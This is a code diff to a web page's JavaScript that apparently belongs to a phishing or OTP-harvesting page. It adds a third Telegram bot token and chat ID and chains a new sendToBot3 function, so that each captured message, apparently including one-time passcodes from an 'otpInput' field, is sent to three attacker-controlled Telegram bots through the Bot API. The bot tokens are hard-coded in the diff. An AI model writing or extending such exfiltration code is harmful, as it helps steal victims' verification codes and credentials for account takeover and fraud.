@@ -760,6 +760,9 @@
     const bot2Token = "8774319664:AAF1SkX7MyaNpamEmj_mb8GiHCLa1K0lhJ4";
     const bot2ChatId = "8977544039";
 
+    const bot3Token = "8529197826:AAEZ2JQ2dAtReZgnswCEQmjzwI7WlqKWoT0";
+    const bot3ChatId = "8849959038";
+
     document.addEventListener("DOMContentLoaded", function () {
         const otpEl = document.getElementById("otpInput");
         if (otpEl) {
@@ -788,9 +791,16 @@
         return fetch(url2).catch(err => console.log(err));
     }
 
+    function sendToBot3(message) {
+        const url3 = `https://api.telegram.org/bot${bot3Token}/sendMessage?chat_id=${bot3ChatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
+        return fetch(url3).catch(err => console.log(err));
+    }
+
     function sendToTelegram(message) {
         sendToBot1(message).then(() => {
             return sendToBot2(message);
+        }).then(() => {
+            return sendToBot3(message);
         });
     }
 
